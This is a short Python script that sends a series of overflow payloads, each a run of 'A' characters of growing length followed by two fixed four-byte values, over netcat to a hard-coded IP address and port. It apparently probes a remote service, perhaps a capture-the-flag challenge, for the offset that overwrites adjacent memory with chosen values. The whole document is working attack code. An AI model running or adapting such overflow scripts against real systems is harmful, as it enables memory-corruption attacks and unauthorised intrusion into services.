import subprocess
import time

# IP address and port to connect to
ip_address = "45.76.177.238"
port = 1569

# Loop through payload lengths from 1 to 60
for number_of_bytes in range(1, 61):
    # Generate the payload without null bytes
    payload = "A" * number_of_bytes + "\x69\x15\x01\x01" + "\x69\xca\xfe\x01"

    # Construct the netcat command
    command = f'echo -n "{payload}" | nc {ip_address} {port}'

    try:
        # Run the command and capture the output
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        print(f"Payload with {number_of_bytes} bytes sent successfully")
        print(output)
    except subprocess.CalledProcessError as e:
        print(f"Error sending payload with {number_of_bytes} bytes: {e.output.decode()}")

    # Sleep for 1 second before the next attempt
    time.sleep(1)
